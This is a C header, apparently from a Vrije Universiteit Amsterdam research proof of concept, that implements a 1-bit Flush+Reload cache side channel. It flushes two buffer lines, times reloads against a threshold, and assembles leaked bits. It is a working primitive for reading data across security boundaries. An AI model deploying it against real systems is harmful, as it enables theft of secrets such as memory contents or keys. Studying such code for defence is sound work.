/*
 * Thursday, September 9th 2021
 *
 * Enrico Barberis - e.barberis@vu.nl
 * Pietro Frigo - p.frigo@vu.nl
 * Marius Muench - m.muench@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

//Implementation of a 1-bit Flush+Reload

#ifndef _FLUSH_RELOAD_H_
#define _FLUSH_RELOAD_H_

#include <ctype.h>
#include <stdint.h>
#include "targets.h"
#include "helper.h"

/* flush all lines of the reloadbuffer */
static inline __attribute__((always_inline)) void flush(uint8_t *reloadbuffer) {
    clflush(reloadbuffer + 0*STRIDE);
    clflush(reloadbuffer + 1*STRIDE);
    fence();
}

/* update results based on timing of reloads */
static inline __attribute__((always_inline)) void reload(unsigned char *reloadbuffer, size_t *results) {
    fence();

    for (size_t k = 0; k < 2; ++k) {
        unsigned char *p = reloadbuffer + (STRIDE * k);
        if (load_time(p) < THR) results[k]++;
    }
}

static inline __attribute__((always_inline)) void add_bit_leak(uint8_t *byte, int pos, size_t *results) {
    if(results[1] > results[0]) {
        *byte = (*byte) | (1<<pos);
    }
} 

#endif
